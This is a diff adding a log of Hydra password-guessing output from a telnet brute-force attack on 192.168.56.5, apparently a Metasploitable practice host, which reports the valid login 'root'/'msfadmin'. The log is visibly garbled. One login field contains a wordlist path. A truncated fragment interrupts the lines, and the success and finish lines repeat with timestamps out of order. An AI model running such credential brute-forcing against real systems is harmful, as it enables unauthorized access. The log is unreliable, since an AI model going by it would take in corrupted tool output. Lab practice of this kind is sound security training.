@@ -1,0 +1,14 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-11 23:02:45
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking telnet://192.168.56.5:23/
+[23][telnet] host: 192.168.56.5   login: /usr/share/seclists/Usernames/top-usernames-shortlist.txt   password: msfadmin
+[STATUS] attack finished for 192.168.56.5 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-11 23:02:57
+ass "msfadmin" - 4 of 17 [child 3] (0/0)
+[23][telnet] host: 192.168.56.5   login: root   password: msfadmin
+[STATUS] attack finished for 192.168.56.5 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-11 23:02:56
